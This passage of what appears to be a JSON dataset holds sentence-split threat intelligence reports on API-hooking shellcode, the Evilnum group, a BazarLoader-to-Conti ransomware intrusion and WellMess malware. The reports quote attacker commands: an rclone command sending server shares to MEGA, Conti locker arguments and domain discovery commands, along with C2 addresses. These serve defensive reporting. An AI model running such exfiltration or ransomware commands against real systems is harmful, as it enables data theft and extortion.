        "text": "In the end, it returns the modified table.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S67",
        "text": "Rather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difficult, especially since both functions still work and return results normally.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md:::S68",
        "text": "Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S0",
        "text": "Targets are approached with spearphishing emails that contain a link to a ZIP file hosted on Google Drive.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S1",
        "text": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S2",
        "text": "These shortcut files have \u201cdouble extensions\u201d to try to trick the user into opening them, thinking they are benign documents or pictures (in Windows, file extensions for known file types are hidden by default).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S3",
        "text": "The contents of one of the ZIP files are shown in Figure 1.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S4",
        "text": "Once a shortcut file is opened (it doesn\u2019t matter which one, as they all do the same thing), it looks in the contents of its own file for lines with a specific marker and writes them to a .js file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S5",
        "text": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S6",
        "text": "It also deletes the shortcut file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S7",
        "text": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S8",
        "text": "One such decoy is shown in Figure 2 (blurred for privacy).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S9",
        "text": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S10",
        "text": "Documents are collected actively in the group\u2019s current operations, as it targets technical support representatives and account managers, who regularly receive these kinds of documents from their customers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S11",
        "text": "The group reuses the documents on different targets, unless the targets are from different regions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S12",
        "text": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S13",
        "text": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S14",
        "text": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S15",
        "text": "An overview of these is shown in Figure 3.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S16",
        "text": "Each of the various components has its own C&C server, and each component operates independently.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S17",
        "text": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S18",
        "text": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S19",
        "text": "The only exceptions are the C&C servers used by the Golden Chickens components; malware purchased from a MaaS provider, as we describe later.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S20",
        "text": "Those referenced by an IP address can be split into two groups, based on the hosting provider.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S21",
        "text": "The majority of them are hosted with FreeHost, a Ukrainian provider.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S22",
        "text": "The rest are hosted in the Netherlands, with Dotsi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S23",
        "text": "This component communicates with a C&C server and acts as a backdoor without the need for any additional program.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S24",
        "text": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S25",
        "text": "The first known mention of this JavaScript malware was in May 2018 in this pwncode article.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S26",
        "text": "The malware has changed since then and we illustrate these changes in Figure 4.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S27",
        "text": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S28",
        "text": "In that early version it was not possible to upload files to the C&C, only to download files to the victim\u2019s computer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S29",
        "text": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S30",
        "text": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S31",
        "text": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S32",
        "text": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S33",
        "text": "We will not go into details about the technical aspects of this component, as a good analysis of the latest version was published recently by Prevailion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S34",
        "text": "In March 2019, Palo Alto Networks described malware with very similar functionality to the JS component, but coded in C#.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S35",
        "text": "That version (2.5) obtained the address of its C&C by dividing a number by 666, and was therefore named Evilnum by Palo Alto Networks researchers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S36",
        "text": "Since then there have been new versions of the C# malware, the latest of them being version 4.0, which we first saw in April 2020.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S37",
        "text": "The number 666 is not used anymore and the PDB paths of the executables show that the developers call their malware \u201cMarvel\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S38",
        "text": "However, we will continue to name the malware Evilnum to avoid creating confusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S39",
        "text": "The latest version comes bundled in an MSI file (Windows Installer) and runs independent of the JS component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S40",
        "text": "Furthermore, it has different C&Cs than the JS component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S41",
        "text": "However, in all cases that we have seen, the C# component was downloaded and executed after the JavaScript malware gained initial access.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S42",
        "text": "The structure of this component is shown in Figure 6.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S43",
        "text": " \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S44",
        "text": "When the MSI file is executed, three malicious components, along with some .NET Framework library files, are written to disk in %LOCALAPPDATA%\\Microsoft\\Mediia.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S45",
        "text": "The file copier is the first to be executed and its only purpose is to move the files to another location in %LOCALAPPDATA% (see the Indicators of Compromise section for the folder names).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S46",
        "text": "The loader is then executed and it loads and decrypts the contents of the file System.Memmory.dll, which is the actual malicious payload (DLL Agent) for the C# component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S47",
        "text": "AES encryption is used for the DLL and for obfuscation of the strings in the payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S48",
        "text": "The same key and initialization vector are used to encrypt the strings in all of the different versions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S49",
        "text": "The IP address of the C&C server is hardcoded and in plain text.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S50",
        "text": "A GET request is sent for /Validate/valsrv and if the response body contains the text youwillnotfindthisanywhare, then the server is accepted.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S51",
        "text": "Otherwise, a GitLab page is parsed to get the IP address of a second server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S52",
        "text": "The following capabilities are present in version 4.0:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S53",
        "text": "Take screenshots if the mouse has been moved in a period of time, and send them to the C&C, base64 encoded.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S54",
        "text": "The image is stored in a file called SC4.P7D\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S55",
        "text": "- Run commands",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S56",
        "text": "- Run other binaries via cmd.exe\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S57",
        "text": "- Send information such as computer name, username and antivirus installed\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md:::S58",
        "text": "- Persist in a compromised system by creating registry keys\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S0",
        "text": "In August, we witnessed an intrusion that started from a BazarLoader infection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S1",
        "text": "A Phishing campaign distributing password-protected zip files with weaponized documents to victims was the likely delivery source.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S2",
        "text": "Macros inside the word document extracted and executed a malicious .HTA document, which downloaded and loaded the BazarLoader DLL in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S3",
        "text": "It is now apparent to the information security community that intrusions starting with BazarLoader frequently end with Conti ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S4",
        "text": "This case saw such a conclusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S5",
        "text": "There are some evident similarities in cases that involve Conti ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S6",
        "text": "Ransomware operators\u2019 tooling and overall tasks performed tend to match across the cluster.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S7",
        "text": "When we look at our earlier Conti case, this becomes noticeable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S8",
        "text": "This could be due to the widely circulated Conti manual that was leaked by an affiliate.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S9",
        "text": "In this case, we saw the same pattern of events with tools like net, nltest, ShareFinder for discovery, Cobalt Strike for C2, and WMIC remote process creation for expanding their access within the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S10",
        "text": "Even though the intrusion lasted for five days total, Cobalt Strike and hands-on keyboard operators showed up in the first two hours of the intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S11",
        "text": "Straight away, they started gathering information to get the lay of the land using Net commands.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S12",
        "text": "Then they continued looking for open shares by executing the PowerView module, Invoke-ShareFinder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S13",
        "text": "After collecting and dissecting the results from ShareFinder, they appeared to have a good understanding of the server and workstation layout of the organization as they started executing commands to gather information from specific, high-value servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S14",
        "text": "During that time, we saw errors when operators failed to alter specific parameters that indicate the operator is acting from a pre-defined playbook.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S15",
        "text": "They eventually decided to pivot laterally to a server using WMIC to execute a DLL Cobalt Strike beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S16",
        "text": "Once they had access to the remote server via the Cobalt Strike beacon, they re-ran Invoke-ShareFinder and then exfiltrated data of interest from a different server using the Rclone application via the MEGA cloud storage service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S17",
        "text": "On the second day, the threat actors used RDP to access the backup server and in doing so, reviewed the backup settings, and running processes on the server via the taskmanager GUI.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S18",
        "text": "On day four, the threat actors returned and ran another round of exfiltration using Rclone and MEGA again.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S19",
        "text": "On the fifth day, they moved fast towards their final objective, which was Conti ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S20",
        "text": "Before executing Conti, they used RDP to install and configure the AnyDesk remote desktop application.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S21",
        "text": "Having GUI access, they attempted to use ProcessHacker to dump the LSASS process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S22",
        "text": "After this last step, they deployed Conti ransomware via a batch script to all domain joined systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S23",
        "text": "One interesting fact about this case is that the threat actors were not seen interacting with the Domain Controllers (DCs).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S24",
        "text": "Most ransomware cases we see involve the threat actor executing code on the DCs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S25",
        "text": "Thanks to @James_inthe_box for the sample!",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S26",
        "text": "As with previously documented intrusions, a weaponized Microsoft Word document is used to lure the user into enabling a macro to execute the payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S27",
        "text": "The user is presented with the following:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S28",
        "text": "Reviewing the file we can observe that the filetype while labeled as a .doc file appears as XML when reviewing the file attributes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S29",
        "text": "A deeper inspection shows the Word 2003 XML formatting and the contained macro.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S30",
        "text": "Once the macro has been enabled, in the next stage, an HTML Application (HTA) file is created and dropped into the user\u2019s folder:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S31",
        "text": "Followed by the execution of the HTA:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S32",
        "text": "Analysis of the HTA file shows a mix of encoded HTML and JavaScript/VBScript code, not to mention profanity at the start of the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S33",
        "text": "The base64 encoded string can be decoded to:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S34",
        "text": "The code downloads a binary file (compareForfor.jpg) masquerading as a JPG (Image file) from millscruelg[.]com to the following folder \u201cc:\\users\\public\u201d, and incorporating VBScript code, utilizes REGSVR32 to execute this DLL.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S35",
        "text": "This initiates a connection to 64.227.65[.]60:443 and invokes a Svchost.exe, followed by a lookup to myexternalip[.]com to retrieve the external public-facing IPv4 address of the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S36",
        "text": "The attacker could use this information to verify the network being targeted and/or to facilitate tool configuration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S37",
        "text": "Two DLLs were loaded via RunDll32 using the Svchost process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S38",
        "text": "The first was D574.dll:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S39",
        "text": "Followed by D8B3.dll:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S40",
        "text": "D8B3.dll injected into the Winlogon process (high integrity):",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S41",
        "text": "In the case of D8B3.dll, the DLL was Go compiled.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S42",
        "text": "Both DLLs had invalid certificates and could be detected by checking for any failed/revoked status.:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S43",
        "text": "Additionally, each DLL had no populated metadata relating to the DLL:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S44",
        "text": "The process hierarchy tree visualization below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S45",
        "text": "This is very similar to the Bazarloader analysis by Brad Duncan on 11/08/2021.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S46",
        "text": "We observed the AnyDesk application created under the folder c:\\users\\<REDACTED>\\Videos\u2019, an unusual location and suspicious location for process activity \u2013 this is a good detection opportunity where portable executables appear on non-standard file system locations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S47",
        "text": "AnyDesk is a closed source remote desktop application that is available for several operating systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S48",
        "text": "It is free for private use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S49",
        "text": "We observed a long connection initiated from the AnyDesk application towards legitimately registered IPv4 ranges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S50",
        "text": "However, we did not observe many events of interest during these sessions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S51",
        "text": "ProcessHacker was also dropped in the root of C:\\ and likely used to access the LSASS process.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S52",
        "text": "The use of utilities such as ProcessHacker would be unusual for typical users, and applications from a C:\\ root would also be suspicious in certain environments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S53",
        "text": "Using the RunDLL32 and Winlogon process, we observed many typical host and network discovery commands utilizing living off the land techniques such as net, nltest, tasklist and time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S54",
        "text": "Examples included:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S55",
        "text": "tasklist /s <REDACTED> net group \"domain admins\" /dom net localgroup \"administrator\" nltest /domain_trusts /all_trusts net view / all /domain net view / all time ping\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S56",
        "text": "While running some of these commands, copy paste errors were present indicating the operator is likely working from a runbook, like the leaked Conti manual from August as seen via the tasklist /s ip rather than the actual host systems IP\u2019s and seen right after this mistake.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S57",
        "text": "Cmd.exe process invoked a lot of the commands with unusual parent processes such as RunDLL32.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S58",
        "text": "The example below using the time command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S59",
        "text": "Red Canary provides a good detection guide for RunDLL32; this covers unusual RunDLL32 activity such as command less, unusual spawned activity, etc.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S60",
        "text": "Discovery command invocation:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S61",
        "text": "AdFind was observed via a file write for the binary, but there was no evidence of execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S62",
        "text": "File share enumeration was achieved using the PowerShell Invoke-ShareFinder script, part of PowerView.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S63",
        "text": "The output file was created at c:\\ProgramData\\found_shares.txt.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S64",
        "text": "The use of this tool has been observed in other recent intrusions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S65",
        "text": "PowerShell was invoked by the WinLogon process and the resulting file created by Rundll32.exe\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S66",
        "text": "On the second day of the intrusion, the threat actors accessed the backup server via RDP via the Cobalt Strike beacon and opened up the back up console on their server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S67",
        "text": "After reviewing the backups, they also opened taskmanager via the GUI (indicated by the /4 in the process command line) to review the running processes on the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S68",
        "text": "A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S69",
        "text": "Remote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S70",
        "text": "The Cobalt Strike beacon (143.dll) injected into the svchost process \u2018svchost.exe -k UnistackSvcGroup -s CDPUserSvc\u2019:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S71",
        "text": "Followed by a request to checkauj[.]com (82.117.252.143).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S72",
        "text": "Approximately 9 hours later, the attacker established an RDP session via the 143.dll.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S73",
        "text": "This was achieved very early in the intrusion, and we were able to correlate the activity:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S74",
        "text": "During this event, we believe that the attacker disclosed the remote workstation name \u2018win-344vu98d3ru\u2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S75",
        "text": "The Bazar DLL masquerading as a jpg made use of HTTPS C2 throughout the full length of the intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S76",
        "text": "The first DLL [D574.dll] didn\u2019t produce any immediate follow on activity, whereas D8B3.dll was loaded by RunDll32 and associated with many activities, from file creation, process execution and persistent network connectivity to 82.117.252[.]143:443 throughout the intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S77",
        "text": "D574.dll loaded by RunDll32 process with persistent DNS query activity to volga.azureedge[.]net, but no established network connectivity.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S78",
        "text": "We observed that the DLL payload \u201cD574.dll\u201d had issues contacting the domain volga.azureedge[.]net and C2 server via DNS 9003 response codes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S79",
        "text": "External sandboxes show the domain tied to other Cobalt Strike beacon samples not associated with this report, it is likely the server was taken down by this time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S80",
        "text": "https://tria.ge/210803-w15fxk72ns",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S81",
        "text": "https://capesandbox.com/analysis/175977/",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S82",
        "text": "D8B3.dll illustrates initial activity, followed by established network connectivity to 82.117.252[.]143:80.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S83",
        "text": "D8B3.dll was the Cobalt Strike beacon the attackers used throughout the intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S84",
        "text": "It was the main payload to facilitate the bulk of the initial intrusion and ongoing activities to maintain access.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S85",
        "text": "The DLL 143.dll used in lateral movement from the beachhead host to the backup server also communicated to this Cobalt Strike server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S86",
        "text": "Once the attackers gained a foothold and pivoted laterally, they were able to switch to using RDP and access specific hosts of interest.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S87",
        "text": "five.azureedge.net 82.117.252.143:80",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S88",
        "text": "checkauj.com 82.117.252.143:443",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S89",
        "text": "82.117.252.143 \u2013 checkauj.com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S90",
        "text": "Once the attackers established access to critical assets, they used RClone to exfiltrate sensitive data to a cloud storage space named MEGA.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S91",
        "text": "The full command used by Rclone includes a variety of parameters, including setting the bandwidth limit.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S92",
        "text": "rclone.exe  copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S93",
        "text": "The use of RClone continues to be an effective tool for bulk data exfiltration.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S94",
        "text": "NCC Group has provided a detailed write-up of the Rclone application and detection methods.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S95",
        "text": "The Rclone activity was observed on two separate instances, each lasting around three hours and occurring between 1900 and 2200 UTC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S96",
        "text": "On the fifth day, the threat actors moved to their final actions to encrypt the domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S97",
        "text": "They first pinged systems across the network via an interactive command shell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S98",
        "text": "Iobit unlocker was also dropped during this phase but we did not see it used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S99",
        "text": "After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S100",
        "text": "The locker.bat is a bespoke script designed to encrypt files across a number of hosts:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S101",
        "text": "Based on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S102",
        "text": "The ransom was then launched via the backup server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S103",
        "text": "To encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S104",
        "text": "C:\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m -net -size 10 -nomutex -p",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S105",
        "text": "\\\\TARGETHOST\\C$",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S106",
        "text": "Here\u2019s an overview of the execution:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S107",
        "text": "Analysis of the DLLs accompanying the EXE indicates Conti artifacts:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S108",
        "text": "Once the encryption was completed, the following ransomware note dropped in all affected directories as \u2018readme.txt\u2019",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S109",
        "text": "The content of these text files:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-516.md:::S110",
        "text": "Following the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts \u2013 likely to validate and assess that the locker encryption was successful:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S0",
        "text": "The WellMess sample we examine in this insight is written in Go, though .NET WellMess samples also exist.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S1",
        "text": "The Go malware comes in 32-bit and 64-bit variants as both ELF and PE files, allowing the threat actor to develop the malware once and deploy it to many different architectures.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S2",
        "text": "The most recent samples of WellMess differ from the 2018 samples as they now support communicating with the C2 server via three separate communication methods.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S3",
        "text": "The sample analysed in this report is typical of the latest generation of WellMess.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S4",
        "text": "The malware builds a pipe-separated userParameters string based on the victim machine\u2019s computer name, user domain, user name and several hardcoded values in the malware, and stores it for use throughout the malware\u2019s execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S5",
        "text": "An example string would be:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S6",
        "text": "The bold values are taken from data hardcoded in the binary and likely represent campaign or platform information about the running malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S7",
        "text": "In this sample a copy of the string then has the NTSUUpIIaFEU string appended for a second time and then MD5 hashed which is stored for later use.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md:::S8",
        "text": "As mentioned, the malware can communicate with the C2 server via three communication methods with each being enabled or disabled on a per sample basis.",
        "type": ""
    },
    {
